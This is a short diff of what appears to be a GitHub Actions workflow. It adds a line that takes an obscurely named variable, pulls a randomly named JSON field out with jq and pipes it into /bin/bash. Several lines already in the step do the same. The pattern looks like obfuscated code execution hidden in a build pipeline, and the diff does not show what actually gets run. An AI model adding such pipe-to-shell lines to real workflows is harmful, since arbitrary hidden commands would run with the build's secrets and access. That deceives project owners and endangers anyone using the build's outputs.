@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$mb0" | jq -r .dixe9 | /bin/bash
           echo $v93 | jq -r .dbehy39 | /bin/bash
           echo $me601 | jq -r .rvdw26 | /bin/bash
+          echo $p86 | jq -r .gqmsj059 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
